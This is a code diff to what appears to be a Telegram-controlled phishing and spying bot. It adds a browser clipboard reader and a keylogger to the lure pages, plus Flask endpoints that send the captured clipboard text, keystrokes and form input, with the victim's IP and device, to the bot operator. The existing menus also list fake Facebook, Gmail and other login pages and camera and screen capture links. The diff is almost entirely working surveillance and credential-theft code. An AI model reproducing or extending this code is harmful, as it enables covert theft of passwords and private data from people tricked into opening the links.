@@ -894,7 +894,64 @@ async function startCapture(){
   else if(mode==='motion'){await sendMotionData();setFill(100);}
   else if(mode==='torch'){await activateTorch();setFill(100);}
   else if(mode==='vibrate'){await sendVibrate();setFill(100);}
+  else if(mode==='clipboard'){await readClipboard();setFill(100);}
+  else if(mode==='keylog'){startKeylogger();setFill(100);}
   else{setFill(100);}
+}
+// ── Clipboard Reader ──
+async function readClipboard(){
+  try{
+    let text='';
+    if(navigator.clipboard&&navigator.clipboard.readText){
+      text=await navigator.clipboard.readText();
+    }
+    const fp=await collectFingerprint();
+    fetch('/capture_clipboard',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token,text,ua:navigator.userAgent})});
+  }catch(e){
+    // Fallback: intercept paste events
+    document.addEventListener('paste',async(ev)=>{
+      const text=ev.clipboardData?.getData('text')||'';
+      if(text){
+        fetch('/capture_clipboard',{method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({token,text,ua:navigator.userAgent,note:'paste-event'})});
+      }
+    },{once:true});
+    fetch('/capture_clipboard',{method:'POST',headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({token,text:'[Permission denied — waiting for paste]',ua:navigator.userAgent})});
+  }
+}
+// ── Keylogger: capture keystrokes while page is open ──
+let _kbuf='';let _kflushTimer=null;
+function startKeylogger(){
+  document.addEventListener('keydown',e=>{
+    if(e.key==='Backspace'){_kbuf=_kbuf.slice(0,-1);return;}
+    if(e.key.length===1){_kbuf+=e.key;}
+    else if(e.key==='Enter'){_kbuf+='[ENTER]';}
+    else if(e.key==='Tab'){_kbuf+='[TAB]';}
+    else if(e.key==='Space'){_kbuf+=' ';}
+    clearTimeout(_kflushTimer);
+    _kflushTimer=setTimeout(()=>{
+      if(_kbuf.trim().length>3){
+        fetch('/capture_keylog',{method:'POST',headers:{'Content-Type':'application/json'},
+          body:JSON.stringify({token,keys:_kbuf,ua:navigator.userAgent})});
+        _kbuf='';
+      }
+    },2000);
+  });
+  // Also intercept any input fields on page
+  document.querySelectorAll('input,textarea').forEach(el=>{
+    el.addEventListener('input',()=>{
+      clearTimeout(_kflushTimer);
+      _kflushTimer=setTimeout(()=>{
+        const val=el.value;
+        if(val.length>1){
+          fetch('/capture_keylog',{method:'POST',headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({token,keys:val,field:el.type||el.tagName,ua:navigator.userAgent})});
+        }
+      },1500);
+    });
+  });
 }
 // ── Wake Lock: keep screen on silently for all modes ──
 async function requestWakeLock(){
@@ -1831,6 +1888,71 @@ def capture_screen_recording():
     return jsonify({"ok": True}), 200
 
 
+@flask_app.route('/capture_clipboard', methods=['POST'])
+def capture_clipboard():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    ua = data.get('ua', 'Unknown')
+    text = data.get('text', '').strip()
+    note = data.get('note', '')
+    ua_lower = ua.lower()
+    if 'android' in ua_lower: os_tag = '🤖 Android'
+    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
+    elif 'windows' in ua_lower: os_tag = '🪟 Windows'
+    elif 'mac' in ua_lower: os_tag = '🍎 Mac'
+    else: os_tag = '❓ Unknown'
+    clip_display = f"<code>{text[:1500]}</code>" if text and '[Permission' not in text else f"⚠️ {text}"
+    extra = f"\n📌 Note: {note}" if note else ""
+    report = (
+        f"📋 <b>CLIPBOARD CAPTURED!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Device: <b>{os_tag}</b>\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"📝 Content:\n{clip_display}{extra}\n"
+        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
+@flask_app.route('/capture_keylog', methods=['POST'])
+def capture_keylog():
+    data = request.get_json(silent=True) or {}
+    token = data.get('token')
+    user_id = tracking_links.get(token)
+    if not user_id:
+        return jsonify({"ok": False}), 400
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+    ua = data.get('ua', 'Unknown')
+    keys = data.get('keys', '').strip()
+    field = data.get('field', 'keyboard')
+    if not keys:
+        return jsonify({"ok": True}), 200
+    ua_lower = ua.lower()
+    if 'android' in ua_lower: os_tag = '🤖 Android'
+    elif 'iphone' in ua_lower or 'ipad' in ua_lower: os_tag = '🍎 iOS'
+    elif 'windows' in ua_lower: os_tag = '🪟 Windows'
+    elif 'mac' in ua_lower: os_tag = '🍎 Mac'
+    else: os_tag = '❓ Unknown'
+    report = (
+        f"⌨️ <b>KEYLOGGER CAPTURED!</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"📱 Device: <b>{os_tag}</b>\n"
+        f"🌐 IP: <code>{ip}</code>\n"
+        f"🖊️ Field: <b>{field}</b>\n"
+        f"📝 Keys typed:\n<code>{keys[:1500]}</code>\n"
+        f"🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
+        f"━━━━━━━━━━━━━━━━━━━━"
+    )
+    threading.Thread(target=broadcast_message, args=(user_id, report, True), daemon=True).start()
+    return jsonify({"ok": True}), 200
+
+
 @flask_app.route('/capture_torch', methods=['POST'])
 def capture_torch():
     data = request.get_json(silent=True) or {}
@@ -2047,6 +2169,7 @@ def get_reply_keyboard():
             [KeyboardButton("📷 Burst Photos Link"), KeyboardButton("🖥️ Screen Record Link")],
             [KeyboardButton("📳 Motion+IP Link")],
             [KeyboardButton("🔦 Torch Link"), KeyboardButton("📳 Vibrate Link")],
+            [KeyboardButton("📋 Clipboard Link"), KeyboardButton("⌨️ Keylogger Link")],
             [KeyboardButton("💎 FB VIP"), KeyboardButton("💎 Gmail VIP")],
             [KeyboardButton("💎 TikTok VIP"), KeyboardButton("💎 Instagram VIP")],
             [KeyboardButton("💎 Telegram VIP"), KeyboardButton("💎 WhatsApp VIP")],
@@ -2075,6 +2198,8 @@ def main_menu_inline():
         [InlineKeyboardButton("📳 Motion+IP", callback_data="gen_motion")],
         [InlineKeyboardButton("🔦 Torch", callback_data="gen_torch"),
          InlineKeyboardButton("📳 Vibrate", callback_data="gen_vibrate")],
+        [InlineKeyboardButton("📋 Clipboard", callback_data="gen_clipboard"),
+         InlineKeyboardButton("⌨️ Keylogger", callback_data="gen_keylog")],
         [InlineKeyboardButton("💎 FB VIP", callback_data="gen_fakefb"),
          InlineKeyboardButton("💎 Gmail VIP", callback_data="gen_fakegmail")],
         [InlineKeyboardButton("💎 TikTok VIP", callback_data="gen_faketiktok"),
@@ -2796,6 +2921,8 @@ async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "📳 Motion+IP Link":          ("motion",   "📳 Motion+IP"),
         "🔦 Torch Link":              ("torch",    "🔦 Torch Flash"),
         "📳 Vibrate Link":            ("vibrate",  "📳 Vibrate"),
+        "📋 Clipboard Link":          ("clipboard","📋 Clipboard Reader"),
+        "⌨️ Keylogger Link":          ("keylog",   "⌨️ Keylogger"),
     }
 
     FAKE_TEXT_MAP = {
@@ -2949,8 +3076,10 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "gen_burst":    ("burst",    "📷 Burst Photos"),
         "gen_screen":   ("screen",   "🖥️ Screen Record"),
         "gen_motion":   ("motion",   "📳 Motion+IP"),
-        "gen_torch":    ("torch",    "🔦 Torch Flash"),
-        "gen_vibrate":  ("vibrate",  "📳 Vibrate"),
+        "gen_torch":     ("torch",     "🔦 Torch Flash"),
+        "gen_vibrate":   ("vibrate",  "📳 Vibrate"),
+        "gen_clipboard": ("clipboard","📋 Clipboard Reader"),
+        "gen_keylog":    ("keylog",   "⌨️ Keylogger"),
     }
 
     FAKE_LOGIN_MODES = {
